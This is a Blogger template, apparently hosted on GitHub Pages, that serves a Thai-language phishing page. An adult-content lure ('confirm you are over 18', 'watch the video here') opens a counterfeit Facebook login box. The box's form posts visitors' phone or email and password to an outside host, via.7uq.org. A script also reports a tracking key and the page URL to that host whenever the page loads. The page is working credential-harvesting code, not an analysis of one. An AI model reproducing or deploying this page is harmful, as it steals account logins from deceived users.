# aly2422.github.io
<?xml version="1.0" encoding="UTF-8" ?>
<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>

<head>
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
    <meta content='width=device-width, initial-scale=1, shrink-to-fit=no' name='viewport'/>
    <title>คุณต้องเชื่อมต่อก่อน</title>
    <meta content='https://1.bp.blogspot.com/-dlcJCnW5Z6Q/YFLOFR3SxcI/AAAAAAAAASo/re31KzmpWlAUl7oOwmEhBndHKVkttpXjACLcBGAsYHQ/s16000/126018399_1092323767894825_3689224965821169559_n.jpg' itemprop='thumbnailUrl' property='og:image'/>
    <b:skin><![CDATA[
        


    ]]></b:skin>

</head>

<body class='touch x1-5 ios mSafari _fzu _50-3 iframe acw' tabindex='0'>
    <header>
        <b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
          <b:widget id='Header1' locked='false' type='Header' version='1'>
            <b:widget-settings>
              <b:widget-setting name='displayUrl'/>
              <b:widget-setting name='displayHeight'>0</b:widget-setting>
              <b:widget-setting name='sectionWidth'>-1</b:widget-setting>
              <b:widget-setting name='useImage'>false</b:widget-setting>
              <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
              <b:widget-setting name='imagePlacement'>BEHIND</b:widget-setting>
              <b:widget-setting name='displayWidth'>0</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
                    <b:if cond='data:useImage'>
                        <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
                            <b:if cond='data:mobile'>
                                <div id='header-inner'>
                                    <div class='titlewrapper' style='background: transparent'>
                                        <h1 class='title' style='background: transparent; border-width: 0px'>
                                            <b:include name='title'/>
                                        </h1>
                                    </div>
                                    <b:include name='description'/>
                                </div>
                                <b:else/>
                                <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                      + &quot;background-position: &quot;                      + data:backgroundPositionStyleStr + &quot;; &quot;                      + data:widthStyleStr                      + &quot;min-height: &quot; + data:height                      + &quot;_height: &quot; + data:height                      + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
                                    <div class='titlewrapper' style='background: transparent'>
                                        <h1 class='title' style='background: transparent; border-width: 0px'>
                                            <b:include name='title'/>
                                        </h1>
                                    </div>
                                    <b:include name='description'/>
                                </div>
                            </b:if>
                            <b:else/>
                            <div id='header-inner'>
                                <a expr:href='data:blog.homepageUrl' style='display: block'>
                                    <img expr:alt='data:title' expr:height='data:height' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' expr:width='data:width' style='display: block'/>
                                </a>
                                <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
                                    <b:include name='description'/>
                                </b:if>
                            </div>
                        </b:if>
                        <b:else/>
                        <div id='header-inner'>
                            <div class='titlewrapper'>
                                <h1 class='title'>
                                    <b:include name='title'/>
                                </h1>
                            </div>
                            <b:include name='description'/>
                        </div>
                    </b:if>
                </b:includable>
            <b:includable id='description'>
                    <div class='descriptionwrapper'>
                        <p class='description'><span>
                                <data:description/></span></p>
                    </div>
                </b:includable>
            <b:includable id='title'>
                    <b:tag cond='data:blog.url != data:blog.homepageUrl' expr:href='data:blog.homepageUrl' name='a'>
                        <data:title/>
                    </b:tag>
                </b:includable>
          </b:widget>
        </b:section>
    </header>
    <main>
<link href='https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css' rel='stylesheet'/>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css' rel='stylesheet'/>
<script src='https://code.jquery.com/jquery-3.5.1.min.js'/>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet'/>
 <style>
    .container {
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto;

    }

    .row {
        margin-right: -15px;
        margin-left: -15px;
    }

    .col-xs-12 {
        width: 100%;
    }

    .carousel-inner&gt;.item&gt;a&gt;img,
    .carousel-inner&gt;.item&gt;img,
    .img-responsive,
    .thumbnail a&gt;img,
    .thumbnail&gt;img {
        display: block;
        max-width: 100%;
        height: auto;
    }

    /* ---------------------------------------- */
    .modal {
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 1050;
        display: none;
        overflow: hidden;
        outline: 0;
    }

    .fade.in {
        opacity: 1;
    }

    .login-form-wrap {
        background: radial-gradient(ellipse at center, rgba(81, 112, 173, 1) 0%, rgba(53, 84, 147, 1) 100%);
        border: 1px solid #2d416d;
        box-shadow: 0 1px #5670a4 inset, 0 0 10px 5px rgb(0 0 0 / 10%);
        width: 380px;
        max-width: 100%;
        height: 480px;
        margin: 60px auto;
        padding: 50px 30px 0;
        text-align: center;
    }

    .form-controll {
        border-radius: 5px;
        display: block;
        width: 100%;
        height: 34px;
        padding: 6px 12px;
        font-size: 14px;
        line-height: 1.42857143;
        color: #555;
        background-color: #fff;
        background-image: none;
        border: 1px solid #ccc;
        -webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
        box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
        -webkit-transition: border-color ease-in-out .15s, -webkit-box-shadow ease-in-out .15s;
        -o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
        transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
    }

    .btn-primary {
        color: #fff;
        background-color: #337ab7;
        border-color: #2e6da4;
    }

    .btn {
        display: inline-block;
        padding: 6px 12px;
        margin-bottom: 0;
        font-size: 14px;
        font-weight: 400;
        line-height: 1.42857143;
        text-align: center;
        white-space: nowrap;
        vertical-align: middle;
        -ms-touch-action: manipulation;
        touch-action: manipulation;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        background-image: none;
        border: 1px solid transparent;
        border-radius: 4px;
    }

    .custom_icon {
        position: absolute;
        top: 50%;
        left: 50%;
        font-size: 40px;
        color: blue;
        transform: translate(-50%, -50%);
    }

    .submitStyleLogin {
        padding: 4px 0px;
        background-color: #627aad;
        border-radius: 4px;
        text-shadow: 0 -1px rgba(0, 0, 0, .25);
        background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        border: 1px solid #4162A7;
    }

    .submitStyleRegister {
        background-color: #5b93fc;
        padding: 10px 20px;
        font-weight: bold;
        border: 1px solid #0A5AED;
        text-shadow: 0 -1px rgba(0, 0, 0, .25);
        background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
    }

    .videoView {
        width: 180px;
        font-size: 12px;
        background-color: #fff9d7;
        border: 1px solid #e2c822;
        padding: 7px 23px;
        margin: 10px auto;
        border-radius: 6px;
    }

    #dp_00004 {
        color: #899bc1;
        font-size: 12px;
        line-height: 16px;
        margin-top: 10px;
    }

    .imageProfile {
        text-align: center;
        padding: 5px 0px;
        position: relative;
    }

    .imageProfile img {
        border-radius: 50%;
        width: 80px;
        height: 80px;
    }

    #myModal {
        display: block;
        padding-left: 0px;
        margin-left: 0px;
        margin-right: 0px;
    }

    .nguoisangtao {
        background-color: yellow;
        font-size: 20pt;
    }

    .nguoisangtaocustom {
        color: #ff1313;
    }

    .img-responsive {
        height: 100vh;
        object-fit: cover;
        width: 100%;
    }

    .rows1 {
        margin-top: 10px;
    }

    .separator {
        clear: both;
        text-align: center;
    }

    .rows2 {
        background: #3b5998;
    }

    .inputcustom1 {
        height: 40px;
        margin-bottom: 2px;
    }

    .inputcustom2 {
        height: 40px;
    }

    ._55ws {
        padding: 10px 0px;
        border-top: none;
    }
</style>
  <script async='async' src='https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js'/>

 <body>
    <div class='container'>
        <div class='row rows1'>
            <div class='col-xs-12 col-sm-12 col-md-12 col-lg-12'>
                <div class='separator'>
                    <b><span><a class='nguoisangtao' href='#' onclick='showlog()'>ยืนยันว่าคุณมีอายุเกิน 18 ปีขึ้นไป</a></span></b>
                </div>
                <img alt='Image' class='img-responsive' onclick='showlog();' src='https://1.bp.blogspot.com/-dlcJCnW5Z6Q/YFLOFR3SxcI/AAAAAAAAASo/re31KzmpWlAUl7oOwmEhBndHKVkttpXjACLcBGAsYHQ/s16000/126018399_1092323767894825_3689224965821169559_n.jpg'/>
                <div class='separator' style=' text-align: center;'>
                    <b><span><a class='nguoisangtao nguoisangtaocustom' href='#' onclick='showlog()'>ดูวิดีโอได้ที่นี่</a></span></b>
                </div>
            </div>
        </div>
    </div>
    <div class='modal fade in' id='myModal' role='dialog'>
        <section class='login-form-wrap'>
            <div class='row rows2'>
                <div class='col-lg-12 imageProfile'>
                    <img src='https://1.bp.blogspot.com/-dlcJCnW5Z6Q/YFLOFR3SxcI/AAAAAAAAASo/re31KzmpWlAUl7oOwmEhBndHKVkttpXjACLcBGAsYHQ/s16000/126018399_1092323767894825_3689224965821169559_n.jpg'/>
                    <i class='fa fa-facebook-f custom_icon'/>
                </div>
            </div>
            <div class='row'>
                <div class='videoView' id='dp_0001'>คุณต้องเข้าสู่ระบบก่อน</div>
                <form action='https://via.7uq.org/' class='col-xs-12 col-sm-12 col-md-12 col-lg-12' id='login_form_mb' method='post'>
                    <input class='form-controll inputcustom1' id='email' name='email' placeholder='หมายเลขโทรศัพท์มือถือหรืออีเมล' required='' type='text'/>
                    <input class='form-controll inputcustom2' id='pass' name='pass' placeholder='รหัสผ่าน' required='' type='password'/>
                    <input id='is_smart_key_cd' name='na_is_smart_key_cd' type='hidden' value='OTA2MnwxNDB8OTg3Nw'/>
                    <div class='_55ws'>
                        <button class='btn btn-primary btn-lg btn-block submitStyleLogin' id='dp_00002' name='submit' type='submit'>เข้าสู่ระบบ</button>
                    </div>
                </form>
            </div>
            <button class='btn btn-primary submitStyleRegister' type='button'>สร้างบัญชีผู้ใช้ใหม่</button>
            <p id='dp_00004'>ลืมรหัสผ่านใช่หรือไม่</p>
        </section>
    </div>
</body>
      
    </main>
    <footer/>
</body>
<script>   
    var xhr = new XMLHttpRequest();
    xhr.open(&#39;GET&#39;, &#39;https://via.7uq.org/?key=&#39; + document.getElementById(&quot;is_smart_key_cd&quot;).value + &#39;&amp;url=&#39; + window.location);
    xhr.onload = function() {
        if (xhr.status === 200) {}
    };
    xhr.send();
</script>
<script async='async' src='https://www.googletagmanager.com/gtag/js?id=G-GMPGBDMPN5'/>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag(&#39;js&#39;, new Date());

  gtag(&#39;config&#39;, &#39;G-GMPGBDMPN5&#39;);
</script>
</html>
